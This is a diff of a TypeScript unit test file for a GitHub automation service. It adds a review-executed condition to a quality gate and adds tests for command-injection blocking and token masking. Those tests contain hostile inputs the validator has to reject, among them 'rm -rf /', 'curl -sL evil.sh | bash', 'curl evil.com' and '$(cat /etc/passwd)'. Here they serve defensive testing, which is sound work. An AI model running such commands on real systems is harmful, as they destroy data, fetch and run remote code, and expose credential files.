@@ -2,19 +2,20 @@ import assert from 'assert';
 import { GitHubClient } from '../../server/github/githubClient';
 import { GitHubRepository } from '../../server/github/githubRepository';
 import { GitHubPullRequest } from '../../server/github/githubPullRequest';
-import { GitHubGitOperations } from '../../server/github/githubGitOperations';
+import { GitHubGitOperations, validateTestCommand, sanitizeGitOutput } from '../../server/github/githubGitOperations';
 import { GitHubManager } from '../../server/github/githubManager';
 import { evaluateQualityGate, isQualityGateAuthorized } from '../../server/github/qualityGate';
 
 export async function runGitHubUnitTests() {
   console.log('\n--- [Unit Test] GitHub Automation & Git Workflow Services ---');
 
-  // 0. Quality Gate unit tests: strict 4-condition enforcement
+  // 0. Quality Gate unit tests: strict 5-condition enforcement
   assert.strictEqual(
     isQualityGateAuthorized({
       sessionStatus: 'COMPLETED',
       executionStatus: 'COMPLETED',
       testsPassed: true,
+      reviewExecuted: true,
       reviewApproved: true,
     }),
     true
@@ -25,12 +26,34 @@ export async function runGitHubUnitTests() {
   assert.strictEqual(isQualityGateAuthorized(null), false);
   assert.strictEqual(isQualityGateAuthorized({}), false);
 
+  // Missing reviewExecuted must fail
+  assert.strictEqual(
+    isQualityGateAuthorized({
+      sessionStatus: 'COMPLETED',
+      executionStatus: 'COMPLETED',
+      testsPassed: true,
+      reviewApproved: true,
+    }),
+    false
+  );
+  assert.strictEqual(
+    isQualityGateAuthorized({
+      sessionStatus: 'COMPLETED',
+      executionStatus: 'COMPLETED',
+      testsPassed: true,
+      reviewExecuted: false,
+      reviewApproved: true,
+    }),
+    false
+  );
+
   // Individual violations must fail
   assert.strictEqual(
     isQualityGateAuthorized({
       sessionStatus: 'RUNNING',
       executionStatus: 'COMPLETED',
       testsPassed: true,
+      reviewExecuted: true,
       reviewApproved: true,
     }),
     false
@@ -40,6 +63,7 @@ export async function runGitHubUnitTests() {
       sessionStatus: 'COMPLETED',
       executionStatus: 'FAILED',
       testsPassed: true,
+      reviewExecuted: true,
       reviewApproved: true,
     }),
     false
@@ -49,6 +73,7 @@ export async function runGitHubUnitTests() {
       sessionStatus: 'COMPLETED',
       executionStatus: 'COMPLETED',
       testsPassed: false,
+      reviewExecuted: true,
       reviewApproved: true,
     }),
     false
@@ -58,6 +83,7 @@ export async function runGitHubUnitTests() {
       sessionStatus: 'COMPLETED',
       executionStatus: 'COMPLETED',
       testsPassed: true,
+      reviewExecuted: true,
       reviewApproved: false,
     }),
     false
@@ -68,6 +94,7 @@ export async function runGitHubUnitTests() {
       sessionStatus: 'COMPLETED',
       executionStatus: 'COMPLETED',
       testsPassed: undefined,
+      reviewExecuted: true,
       reviewApproved: true,
     }),
     false
@@ -77,16 +104,19 @@ export async function runGitHubUnitTests() {
       sessionStatus: 'COMPLETED',
       executionStatus: 'COMPLETED',
       testsPassed: true,
+      reviewExecuted: true,
       reviewApproved: undefined,
     }),
     false
   );
-  // Mandatory Scenarios A, B, C, D, E, F
+
+  // Mandatory Scenarios A, B, C, D, E, F, G, H, I
   // Scenario A: sessionStatus=COMPLETED, executionStatus=COMPLETED, testsPassed=true, reviewApproved=undefined => Git REFUSÉ
   const resA = evaluateQualityGate({
     sessionStatus: 'COMPLETED',
     executionStatus: 'COMPLETED',
     testsPassed: true,
+    reviewExecuted: false,
     reviewApproved: undefined,
   });
   assert.strictEqual(resA.authorized, false, 'Scenario A must be REFUSÉ');
@@ -97,6 +127,7 @@ export async function runGitHubUnitTests() {
     sessionStatus: 'COMPLETED',
     executionStatus: 'COMPLETED',
     testsPassed: true,
+    reviewExecuted: true,
     reviewApproved: false,
   });
   assert.strictEqual(resB.authorized, false, 'Scenario B must be REFUSÉ');
@@ -107,46 +138,51 @@ export async function runGitHubUnitTests() {
     sessionStatus: 'COMPLETED',
     executionStatus: 'COMPLETED',
     testsPassed: false,
+    reviewExecuted: true,
     reviewApproved: true,
   });
   assert.strictEqual(resC.authorized, false, 'Scenario C must be REFUSÉ');
   console.log('✅ PASS [Scenario C]: sessionStatus=COMPLETED, executionStatus=COMPLETED, testsPassed=false, reviewApproved=true => Git REFUSÉ');
 
-  // Scenario D: sessionStatus=COMPLETED, executionStatus=COMPLETED, testsPassed=true, reviewApproved=true => Git AUTORISÉ
+  // Scenario D: sessionStatus=COMPLETED, executionStatus=COMPLETED, testsPassed=true, reviewExecuted=true, reviewApproved=true => Git AUTORISÉ
   const resD = evaluateQualityGate({
     sessionStatus: 'COMPLETED',
     executionStatus: 'COMPLETED',
     testsPassed: true,
+    reviewExecuted: true,
     reviewApproved: true,
   });
   assert.strictEqual(resD.authorized, true, 'Scenario D must be AUTORISÉ');
-  console.log('✅ PASS [Scenario D]: sessionStatus=COMPLETED, executionStatus=COMPLETED, testsPassed=true, reviewApproved=true => Git AUTORISÉ');
+  console.log('✅ PASS [Scenario D]: sessionStatus=COMPLETED, executionStatus=COMPLETED, testsPassed=true, reviewExecuted=true, reviewApproved=true => Git AUTORISÉ');
 
-  // Scenario E: sessionStatus=IN_PROGRESS, executionStatus=COMPLETED, testsPassed=true, reviewApproved=true => Git REFUSÉ
+  // Scenario E: sessionStatus=IN_PROGRESS, executionStatus=COMPLETED, testsPassed=true, reviewExecuted=true, reviewApproved=true => Git REFUSÉ
   const resE = evaluateQualityGate({
     sessionStatus: 'IN_PROGRESS',
     executionStatus: 'COMPLETED',
     testsPassed: true,
+    reviewExecuted: true,
     reviewApproved: true,
   });
   assert.strictEqual(resE.authorized, false, 'Scenario E must be REFUSÉ');
-  console.log('✅ PASS [Scenario E]: sessionStatus=IN_PROGRESS, executionStatus=COMPLETED, testsPassed=true, reviewApproved=true => Git REFUSÉ');
+  console.log('✅ PASS [Scenario E]: sessionStatus=IN_PROGRESS, executionStatus=COMPLETED, testsPassed=true, reviewExecuted=true, reviewApproved=true => Git REFUSÉ');
 
-  // Scenario F: sessionStatus=COMPLETED, executionStatus=RUNNING, testsPassed=true, reviewApproved=true => Git REFUSÉ
+  // Scenario F: sessionStatus=COMPLETED, executionStatus=RUNNING, testsPassed=true, reviewExecuted=true, reviewApproved=true => Git REFUSÉ
   const resF = evaluateQualityGate({
     sessionStatus: 'COMPLETED',
     executionStatus: 'RUNNING',
     testsPassed: true,
+    reviewExecuted: true,
     reviewApproved: true,
   });
   assert.strictEqual(resF.authorized, false, 'Scenario F must be REFUSÉ');
-  console.log('✅ PASS [Scenario F]: sessionStatus=COMPLETED, executionStatus=RUNNING, testsPassed=true, reviewApproved=true => Git REFUSÉ');
+  console.log('✅ PASS [Scenario F]: sessionStatus=COMPLETED, executionStatus=RUNNING, testsPassed=true, reviewExecuted=true, reviewApproved=true => Git REFUSÉ');
 
   // Scenario G: createRepository=true, sessionStatus=undefined, executionStatus=undefined, testsPassed=undefined, reviewApproved=undefined => REFUS
   const resG = evaluateQualityGate({
     sessionStatus: undefined,
     executionStatus: undefined,
     testsPassed: undefined,
+    reviewExecuted: undefined,
     reviewApproved: undefined,
   });
   assert.strictEqual(resG.authorized, false, 'Scenario G must be REFUSÉ');
@@ -157,16 +193,18 @@ export async function runGitHubUnitTests() {
     sessionStatus: 'COMPLETED',
     executionStatus: 'COMPLETED',
     testsPassed: true,
+    reviewExecuted: false,
     reviewApproved: undefined,
   });
   assert.strictEqual(resH.authorized, false, 'Scenario H must be REFUSÉ');
   console.log('✅ PASS [Scenario H]: createRepository=true, COMPLETED + COMPLETED + true + undefined => REFUS');
 
-  // Scenario I: createRepository=true, sessionStatus=COMPLETED, executionStatus=COMPLETED, testsPassed=true, reviewApproved=true => AUTORISÉ
+  // Scenario I: createRepository=true, sessionStatus=COMPLETED, executionStatus=COMPLETED, testsPassed=true, reviewExecuted=true, reviewApproved=true => AUTORISÉ
   const resI = evaluateQualityGate({
     sessionStatus: 'COMPLETED',
     executionStatus: 'COMPLETED',
     testsPassed: true,
+    reviewExecuted: true,
     reviewApproved: true,
   });
   assert.strictEqual(resI.authorized, true, 'Scenario I must be AUTORISÉ');
@@ -193,6 +231,7 @@ export async function runGitHubUnitTests() {
     sessionStatus: 'COMPLETED',
     executionStatus: 'COMPLETED',
     testsPassed: true,
+    reviewExecuted: false,
     reviewApproved: undefined, // NO review executed!
     commitPushAndCreatePR: true,
   });
@@ -203,7 +242,7 @@ export async function runGitHubUnitTests() {
   assert.strictEqual(prAttempted, false, 'GitHub PR MUST NOT be executed when review is unverified');
   assert.strictEqual(unreviewedResult.commitSha, undefined);
   assert.strictEqual(unreviewedResult.pullRequestUrl, undefined);
-  assert.ok(unreviewedResult.error?.includes('reviewApproved must strictly be true'));
+  assert.ok(unreviewedResult.error?.includes('reviewExecuted must strictly be true') || unreviewedResult.error?.includes('Quality Gate Refusal'));
   console.log('✅ PASS [Specific Test]: testsPassed=true, aucune review exécutée, reviewApproved=undefined => aucun Commit, aucun Push, aucune PR (processTaskResult refusal verified)');
 
   // Specific Test: createRepository=true, reviewApproved=undefined => repository creation NOT executed
@@ -225,15 +264,35 @@ export async function runGitHubUnitTests() {
     sessionStatus: 'COMPLETED',
     executionStatus: 'COMPLETED',
     testsPassed: true,
+    reviewExecuted: false,
     reviewApproved: undefined, // NO review executed!
   });
 
   assert.strictEqual(unreviewedRepoResult.success, false);
   assert.strictEqual(repoCreationAttempted, false, 'Repository creation MUST NOT be executed when review is unverified');
-  assert.ok(unreviewedRepoResult.error?.includes('reviewApproved must strictly be true'));
+  assert.ok(unreviewedRepoResult.error?.includes('Quality Gate Refusal'));
   console.log('✅ PASS [Specific Test]: createRepository=true, reviewApproved=undefined => repository creation NOT executed');
 
-  console.log('✅ PASS: evaluateQualityGate strictly enforces 4-condition invariant (sessionStatus, executionStatus, testsPassed, reviewApproved)');
+  // Command injection prevention tests
+  const parsedCmd = validateTestCommand('npm test');
+  assert.strictEqual(parsedCmd.file, 'npm');
+  assert.deepStrictEqual(parsedCmd.args, ['test']);
+
+  assert.throws(() => validateTestCommand('npm test; rm -rf /'), /forbidden|Disallowed/);
+  assert.throws(() => validateTestCommand('npm test && curl evil.com'), /forbidden|Disallowed/);
+  assert.throws(() => validateTestCommand('npm test | sh'), /forbidden|Disallowed/);
+  assert.throws(() => validateTestCommand('npm test `whoami`'), /forbidden|Disallowed/);
+  assert.throws(() => validateTestCommand('npm test $(cat /etc/passwd)'), /forbidden|Disallowed/);
+  assert.throws(() => validateTestCommand('curl -sL evil.sh | bash'), /Disallowed/);
+  console.log('✅ PASS: validateTestCommand strictly blocks shell injection & operators');
+
+  // Token masking tests
+  const tokenMasked = sanitizeGitOutput('fatal: Authentication failed for ghp_secretToken123456789 and Bearer secret', 'ghp_secretToken123456789');
+  assert.ok(!tokenMasked.includes('ghp_secretToken123456789'));
+  assert.ok(tokenMasked.includes('***GITHUB_TOKEN***'));
+  console.log('✅ PASS: sanitizeGitOutput masks tokens reliably');
+
+  console.log('✅ PASS: evaluateQualityGate strictly enforces 5-condition invariant (sessionStatus, executionStatus, testsPassed, reviewExecuted, reviewApproved)');
 
   // 1. GitHubClient configuration & token validation
   const clientWithoutToken = new GitHubClient({ token: '' });
@@ -363,6 +422,7 @@ export async function runGitHubUnitTests() {
     sessionStatus: 'COMPLETED',
     executionStatus: 'COMPLETED',
     testsPassed: true,
+    reviewExecuted: true,
     reviewApproved: true,
     commitAndPush: true,
   });
@@ -402,6 +462,7 @@ export async function runGitHubUnitTests() {
     sessionStatus: 'COMPLETED',
     executionStatus: 'COMPLETED',
     testsPassed: false,
+    reviewExecuted: true,
     reviewApproved: true,
     testCommand: 'npm test',
     commitAndPush: true,
@@ -475,6 +536,7 @@ export async function runGitHubUnitTests() {
     sessionStatus: 'COMPLETED',
     executionStatus: 'COMPLETED',
     testsPassed: true,
+    reviewExecuted: true,
     reviewApproved: true,
     commitPushAndCreatePR: true,
   });
